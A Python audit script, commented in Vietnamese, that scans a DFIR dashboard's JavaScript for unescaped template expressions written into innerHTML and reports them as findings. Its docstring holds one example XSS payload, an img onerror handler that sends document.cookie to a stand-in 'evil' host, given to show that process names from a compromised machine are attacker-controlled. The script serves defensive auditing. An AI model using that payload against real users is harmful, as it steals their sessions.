#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PORTAL ESCAPE AUDIT (Sprint C — AQ-009)

Mỗi biểu thức `${...}` đi vào `innerHTML` có được escape không?

Vì sao portal DFIR là chỗ nguy hiểm bất thường
-----------------------------------------------
Một dashboard nội bộ thường được coi là hiển thị dữ liệu nội bộ đáng tin. Ở đây
thì ngược lại: bảng điều khiển này hiển thị **tên tiến trình, dòng lệnh, tên tác
vụ theo lịch và đường dẫn tệp thu từ chính máy đang bị theo dõi**. Đó là đầu vào
không đáng tin theo đúng định nghĩa — nếu máy đó đã bị xâm nhập, kẻ tấn công
KIỂM SOÁT nội dung các trường này.

Một tiến trình đặt tên `<img src=x onerror=fetch('//evil/'+document.cookie)>` sẽ
thực thi trong trình duyệt của người trực ca, ngay lúc họ mở dashboard để điều
tra chính cuộc xâm nhập đó.

Sprint 17 viết `escapeHtmlSafe()` và áp nó cho **đúng một panel mới**. 25 sink
còn lại giữ nguyên. Một hàm escape tồn tại mà không được dùng là bằng chứng rằng
đội đã biết rủi ro — không phải rằng rủi ro đã hết.

Cách nhận diện
--------------
Bộ này quét mọi biểu thức `${...}` nằm trong chuỗi template được gán vào
`innerHTML`, và chia làm hai loại:

    AN TOÀN   đi qua escapeHtmlSafe(), hoặc là hằng số / phép tính số học
    RỦI RO    đọc thẳng một trường từ state

Chấp nhận bỏ sót và chấp nhận báo thừa. Mục tiêu là chặn lớp lỗi, không phải
chứng minh toàn bộ mã đúng.
"""

from __future__ import print_function

import io
import os
import re
import sys

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(SCRIPT_DIR)
WEB_DIR = os.path.join(PROJECT_ROOT, 'web')

FILES = ['app.js']

# Biểu thức chỉ chứa những thứ này thì không thể mang HTML vào: hằng số, phép
# tính, so sánh, và các hàm tự sinh chuỗi an toàn của chính portal.
SAFE_TOKENS = re.compile(
    r'^[\s\w.?\[\]()+\-*/%<>=!&|:\'",]*$')

SAFE_CALLS = ('escapeHtmlSafe(', 'qualityChip(', 'scoreText(', 'Math.',
              'Number(', 'parseInt(', 'parseFloat(', '.length', '.toFixed(',
              'String(', 'JSON.stringify(', '.reduce(', 'getBadgeClass(')

# Biến do CHÍNH portal sinh ra từ bảng tra cứu hằng số trong `app.js`, không đến
# từ state. Chúng chỉ nhận được một trong vài giá trị viết sẵn (mã màu, emoji,
# tên lớp CSS), nên không có đường nào để dữ liệu ngoài lọt vào.
#
# Danh sách này phải NGẮN và mỗi mục phải tự biện minh được — vì mỗi mục ở đây
# là một chỗ bộ audit ngừng nhìn. Thêm một cái tên vào đây mà không kiểm lại nó
# được gán từ đâu chính là cách một sink thật lọt qua.
LOCAL_CONSTANTS = set([
    'color', 'sevColor', 'riskColor', 'icon',     # tra từ bảng hằng số màu/biểu tượng
    'severityClass',                              # `severity.toLowerCase()` -> tên lớp CSS
    'rows', 'html',                               # HTML đã dựng ở tầng trong, cố ý
])

# Tên biến/trường chắc chắn do chính portal sinh ra, không đến từ máy được giám
# sát. Danh sách phải NGẮN: mỗi mục là một ngoại lệ phải tự biện minh.
SAFE_NAMES = re.compile(
    r'^[\s]*(?:'
    r'[a-zA-Z_$][\w$]*\s*(?:===|!==|==|!=|>=|<=|>|<)[^`]*'   # so sánh -> boolean
    r'|\d+[\s\w.*/+%-]*'                                      # số
    r'|[a-zA-Z_$][\w$.?\[\]]*\.length[\s\w*/+%-]*'            # đếm
    r')$')

INNER_HTML_RE = re.compile(r'\.innerHTML\s*=')
EXPR_RE = re.compile(r'\$\{([^{}]*(?:\{[^{}]*\}[^{}]*)*)\}')


def template_blocks(lines, start):
    """Thu nội dung chuỗi template bắt đầu từ dòng `start` (0-based)."""
    text = '\n'.join(lines[start:start + 40])
    blocks = []
    index = 0
    while True:
        open_tick = text.find('`', index)
        if open_tick == -1:
            break
        close_tick = open_tick + 1
        while close_tick < len(text):
            if text[close_tick] == '\\':
                close_tick += 2
                continue
            if text[close_tick] == '`':
                break
            close_tick += 1
        blocks.append(text[open_tick + 1:close_tick])
        index = close_tick + 1
        if len(blocks) >= 6:
            break
    return blocks


def is_safe(expression):
    stripped = expression.strip()
    if not stripped:
        return True
    if stripped in LOCAL_CONSTANTS:
        return True
    if any(call in stripped for call in SAFE_CALLS):
        return True
    if SAFE_NAMES.match(stripped):
        return True
    # `x === true ? 'A' : 'B'` — kết quả chỉ có thể là một trong hai chuỗi hằng.
    # Viết `=== true` thay vì `? :` trên giá trị thô cũng loại luôn cái bẫy
    # thứ hai: một chuỗi rỗng hay số 0 trong state sẽ không lặng lẽ thành "NO".
    if re.search(r"===\s*(?:true|false)\s*\?", stripped):
        return True
    # Toán tử ba ngôi mà CẢ HAI nhánh là chuỗi hằng: không mang dữ liệu vào.
    if '?' in stripped and stripped.count("'") >= 2:
        without_strings = re.sub(r"'[^']*'", '', stripped)
        if not re.search(r'[a-zA-Z_$][\w$]*\s*\.', without_strings):
            return True
    return False


def audit_file(filename):
    path = os.path.join(WEB_DIR, filename)
    with io.open(path, encoding='utf-8') as handle:
        lines = handle.read().splitlines()

    findings = []
    # Hai sink nằm gần nhau cùng quét một khối template, nên cùng một biểu thức
    # bị đếm hai lần. Tổng phồng lên là một con số sai theo hướng bi quan — vẫn
    # là một con số sai, và một bộ audit nói sai thì không ai đối chiếu nữa.
    seen = set()
    for number, line in enumerate(lines):
        if not INNER_HTML_RE.search(line):
            continue
        stripped = line.strip()
        if stripped.startswith('//'):
            continue
        for block in template_blocks(lines, number):
            for expression in EXPR_RE.findall(block):
                normalized = ' '.join(expression.split())[:88]
                if normalized in seen:
                    continue
                seen.add(normalized)
                level = 'SAFE' if is_safe(expression) else 'UNESCAPED'
                findings.append({
                    'level': level, 'file': filename, 'line': number + 1,
                    'expression': normalized,
                })
    return findings


def audit():
    findings = []
    for filename in FILES:
        findings.extend(audit_file(filename))
    return findings


def main():
    findings = audit()
    unescaped = [f for f in findings if f['level'] == 'UNESCAPED']
    safe = [f for f in findings if f['level'] == 'SAFE']

    if unescaped:
        print('BIEU THUC CHUA ESCAPE DI VAO innerHTML (%d):' % len(unescaped))
        for finding in unescaped:
            print('  %s:%-5d ${%s}' % (finding['file'], finding['line'],
                                       finding['expression']))
        print('')
        print('Du lieu DFIR den tu may DUOC GIAM SAT. Neu may do da bi xam nhap,')
        print('ke tan cong kiem soat noi dung cac truong nay.')

    print('')
    print('TONG: %d bieu thuc trong innerHTML | %d an toan | %d chua escape'
          % (len(findings), len(safe), len(unescaped)))
    return 1 if unescaped else 0


if __name__ == '__main__':
    if sys.platform == 'win32':
        try:
            sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
        except AttributeError:
            pass
    sys.exit(main())
